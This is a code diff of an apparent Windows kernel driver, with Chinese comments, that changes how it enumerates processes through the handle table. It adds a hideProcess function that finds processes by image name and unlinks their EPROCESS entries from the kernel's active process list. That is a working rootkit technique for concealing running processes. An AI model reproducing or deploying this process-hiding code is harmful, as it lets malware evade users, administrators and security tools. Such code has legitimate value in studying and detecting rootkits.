@@ -14,6 +14,8 @@ static PMY_PROC_LIST_ENTRY FreeListHead = NULL;
 
 //static RTL_OSVERSIONINFOEXW OsVersionInfo;
 
+static BOOLEAN DbgBreak = TRUE;
+
 
 //----------------------------------------------
 // STATIC FUNCTION DECLARARIONS
@@ -39,6 +41,10 @@ static NTSTATUS GetProcessImageName(
 	_Out_ PUNICODE_STRING ProcessImageName
 	);
 
+static BOOLEAN
+addProcess(
+	_In_ ULONG Pid
+	);
 
 //---------------------------------------------
 // FUNCTION DEFINITIONS
@@ -80,45 +86,79 @@ initProcessList()
 NTSTATUS
 getProcessList()
 {
-	PMY_PROC_LIST_ENTRY tempEntry;
+#if DBG
+	if (DbgBreak) {
+		DbgBreak = FALSE;
+		__debugbreak();
+	}
+#endif
+
 	PLIST_ENTRY listEntry;
 	NTSTATUS status = STATUS_SUCCESS;
-	char *imageName;
+	PLIST_ENTRY obHead;
+	PVOID handleTable;
+
+	ULONG pid;
+	PEPROCESS proc;
 
 	// 链表初始化
 	if (!initProcessList()) {
 		return STATUS_INSUFFICIENT_RESOURCES;
 	}
 
-	if (ActiveProcessHead == NULL) {
-		return STATUS_BAD_DATA;
-	}
+	proc = PsGetCurrentProcess();
+	handleTable = GET_OB_TABLE_FROM_EPROCESS(proc);
+	obHead = GET_LIST_ENTRY_FROM_OB_TABLE(handleTable);
 
 	// 设置链表
-	listEntry = ActiveProcessHead->Flink;
-	while (listEntry != ActiveProcessHead) {
-		// 分配内存
-		tempEntry = newMyProcListEntry();
-		if (tempEntry == NULL) {
-			status = STATUS_INSUFFICIENT_RESOURCES;
-			goto ret;
-		}
+	listEntry = obHead;
+	do {
+		pid = GET_PID_FROM_OB_LIST_ENTRY(listEntry);
 
-		tempEntry->Process =
-			GET_EPROCESS_FROM_LIST_ENTRY(listEntry);
+		//KdPrint((DBG_PREFIX "Add process %lu\r\n", pid));
 
-		imageName = GET_IMAGE_NAME_FROM_LIST_ENTRY(listEntry);
-		KdPrint((DBG_PREFIX "%s\r\n", imageName));
-
-		ProcessListTail->Next = tempEntry;
-		ProcessListTail = ProcessListTail->Next;
-
+		addProcess(pid);
 		listEntry = listEntry->Flink;
-	}
+	} while (listEntry != obHead);
 	
-ret:
 	ProcessListNext = ProcessListHead->Next;
 	return status;
+}
+
+BOOLEAN
+addProcess(
+	_In_ ULONG Pid
+	)
+{
+	NTSTATUS status;
+	PEPROCESS proc;
+	PMY_PROC_LIST_ENTRY entry;
+
+	status = PsLookupProcessByProcessId(
+		(HANDLE)Pid,
+		&proc
+		);
+	if (!NT_SUCCESS(status)) {
+		KdPrint((DBG_PREFIX "Addprocess LookupProcess Failed\r\n"));
+
+		return FALSE;
+	}
+
+	entry = ProcessListHead->Next;
+	while (entry != NULL) {
+		if (proc == entry->Process) {
+			return FALSE;
+		}
+
+		entry = entry->Next;
+	}
+
+	entry = newMyProcListEntry();
+	entry->Process = proc;
+
+	ProcessListTail = ProcessListTail->Next = entry;
+
+	return TRUE;
 }
 
 PMY_PROC_LIST_ENTRY
@@ -222,6 +262,42 @@ getProcInfoNext(
 		&ProcInfo->nameBytes);
 
 	ProcessListNext = ProcessListNext->Next;
+
+	ObDereferenceObject(proc);
+	return status;
+}
+
+NTSTATUS
+hideProcess(
+	_In_ PCHAR name
+	)
+{
+	PMY_PROC_LIST_ENTRY entry;
+	NTSTATUS status = STATUS_UNDEFINED_CHARACTER;
+	SIZE_T size;
+	PCHAR imageName;
+	PLIST_ENTRY listEntry;
+
+	initProcessList();
+	getProcessList();
+
+	entry = ProcessListHead->Next;
+	while (entry != NULL) {
+		size = strnlen_s(name, 14);
+		listEntry = GET_LIST_ENTRY_FROM_EPROCESS(entry->Process);
+		imageName = GET_IMAGE_NAME_FROM_LIST_ENTRY(listEntry);
+
+		if (RtlCompareMemory(name, imageName, size) == size) {
+			KdPrint((DBG_PREFIX "Hide process %s\r\n", imageName));
+			status = STATUS_SUCCESS;
+
+			RemoveEntryList(listEntry);
+			InitializeListHead(listEntry);
+		}
+
+		entry = entry->Next;
+	}
+
 	return status;
 }
 
@@ -268,9 +344,6 @@ getImageNameFromProc(
 	return status;
 }
 
-
-static BOOLEAN DbgBreak = TRUE;
-
 VOID
 printActiveProcesses()
 {
@@ -282,13 +355,6 @@ printActiveProcesses()
 	HANDLE hProcess = NULL;
 
 	PMY_PROC_LIST_ENTRY listPtr;
-
-#if DBG
-	if (DbgBreak) {
-		DbgBreak = FALSE;
-		__debugbreak();
-	}
-#endif
 
 	KdPrint((DBG_PREFIX "printActiveProcesses()\r\n"));
 
